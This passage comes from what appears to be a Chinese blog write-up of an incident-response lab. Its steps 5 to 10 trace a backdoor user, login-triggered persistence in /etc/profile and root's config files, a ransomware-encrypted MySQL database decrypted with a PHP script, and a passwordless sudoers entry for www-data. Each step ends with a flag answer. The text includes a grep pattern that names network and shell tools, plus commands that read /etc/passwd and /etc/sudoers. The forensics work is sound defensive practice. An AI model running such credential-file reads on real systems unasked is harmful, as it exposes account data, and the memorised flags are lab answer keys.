class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ee279c39bf3dcb225093bdbafeb9a439&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。</strong></p><p>查看用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215605268.png"></p><p>发现有个用户的用户ID和组ID都为0，权限很高，一般情况下只有管理员的UID和GID为0，说明这个是后门用户，直接加密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4cda3461543c9a770a3349760594facd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</strong></p><p>一般这种情况是修改了shell配置文件，常见的配置文件包括</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用户级别</span><br><span class="line">1、&quot;~/.bashrc&quot;用于配置非登录 Shell 的环境（例如桌面终端）, 每次启动新的非登录 Shell 时加载</span><br><span class="line">2、&quot;~/.bash_profile&quot;用于配置 登录 Shell 的环境, 每次登录（例如通过 SSH 或控制台登录系统）</span><br><span class="line">3、&quot;~/.profile&quot;用于配置 登录 Shell 环境变量, 在用户登录时执行</span><br><span class="line">4、&quot;~/.zshrc&quot;每次启动 Z Shell 的非登录会话时加载</span><br><span class="line">5、&quot;~/.bash_logout&quot;在用户退出登录 Shell 时执行</span><br><span class="line"></span><br><span class="line">系统级别</span><br><span class="line">1、&quot;/etc/profile&quot;用于设置所有用户的登录 Shell 环境变量, 所有用户登录时加载</span><br><span class="line">2、&quot;/etc/bash.bashrc&quot;提供全局的非登录 Shell 配置, 每次启动新的非登录 Shell 时加载</span><br><span class="line">3、&quot;/etc/profile.d/*.sh&quot;当 /etc/profile 加载时, 会依次加载 /etc/profile.d 中的所有脚本文件（通常是 .sh 文件）</span><br><span class="line">4、&quot;/etc/environment&quot;用于配置系统范围的环境变量, 在用户登录前加载，影响所有用户和守护进程</span><br></pre></td></tr></table></figure><p>一般情况执行顺序，可以用作参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.登录 Shell</span><br><span class="line">系统级配置文件：</span><br><span class="line">/etc/profile</span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line">用户级配置文件：</span><br><span class="line">~/.bash_profile（如果不存在，则加载 ~/.profile）</span><br><span class="line">2.非登录 Shell</span><br><span class="line">系统级配置文件：</span><br><span class="line">/etc/bash.bashrc（如果系统支持）</span><br><span class="line">用户级配置文件：</span><br><span class="line">~/.bashrc</span><br></pre></td></tr></table></figure><p>这里一个一个尝试即可，发现&#x2F;etc&#x2F;profile有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124220804951.png"></p><p>直接md5sum加密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5sum /etc/profile</span><br><span class="line">#flag&#123;65bf3e4a9ac90d75ec28be0317775618&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</strong></p><p>搜索后门触发命令，这里搜索的是用户目录下的可疑配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -E &#x27;(nc|curl|wget|bash|python|eval|base64)&#x27; ~/</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221150962.png"></p><p>发现有个配置文件尝试外联恶意网址</p><p>直接加密得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221303685.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4acc9c465eeeb139c194893ec0a8bcbc&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。</strong></p><p>确定数据库类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --type=service | grep -E &#x27;(mysql|mariadb|postgresql|mongodb|redis)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223959804.png"></p><p>查看数据库的登录信息，一般放在配置文件“config.inc.php”里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name config.inc.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221600336.png"></p><p>得到数据库账号密码，用 Premium连接，一个一个尝试，发现有个数据库无法查看，说明被加密了，这里用的大佬的图</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221800705.png"></p><p>查找对应文件，可以得到文件所在路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name JPMorgan@0020Chase</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222206501.png"></p><p>加密文件夹名得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0928a5424aa6126e5923980ca103560e&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。</strong></p><p>查看mysql文件夹，发现有个可疑文件</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222530815.png"></p><p>直接抓取内容看看，发现是个加密脚本</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222620261.png"></p><p>这里要写一个逆推脚本，参考网上的文章</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;2023-11-18&#x27;</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">                    <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">                        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">                        <span class="variable">$decryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedContent</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">                            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$decryptedContent</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的时间是JPMorgan@0020Chase的创建时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat JPMorgan@0020Chase#查看详细信息</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223341527.png"></p><p>把脚本写进&#x2F;var&#x2F;www&#x2F;mysql&#x2F;目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 1.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223537024.png"></p><p>先按<code>i</code>插入代码，然后按一下<code>Esc</code>，再按住<code>shift + :</code>，然后输入<code>wq</code>保存</p><p>运行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 1.php</span><br></pre></td></tr></table></figure><p>重启数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure><p>这时再返回Premium，可以发现数据库解密了，Harper用户对应Areer为Chef，加密即可</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124224210369.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fd82b8864d71ed7fa12b59e6e34cd1c&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。</strong></p><p>这里攻击者用到提权，可以查找以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 2&gt;/dev/null#4000 代表文件权限中的 SUID 位。</span><br></pre></td></tr></table></figure><p>当一个文件被设置了 SUID 位，并且用户执行该文件时，该程序会以文件拥有者（通常是 root）的权限运行，而不是以当前用户的权限运行</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124224704235.png"></p><p>发现&#x2F;usr&#x2F;bin&#x2F;sudo，sudo 被广泛用于权限提升，估计攻击者通过这个提权，&#x2F;etc&#x2F;sudoers 包含了系统上 sudo 的配置和权限设置，这里抓取内容看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124225016730.png"></p><p>www-data用户被赋予了root权限，而且不需要输入密码，到这里已经可以确认漏洞配置了，就是&#x2F;etc&#x2F;sudoers ，加密文件得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124225250689.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6585817513b0ea96707ebb0d04d6aeff&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>Peterpan.exe：<a href="https://blog.csdn.net/administratorlws/article/details/140471298">https://blog.csdn.net/administratorlws/article/details/140471298</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
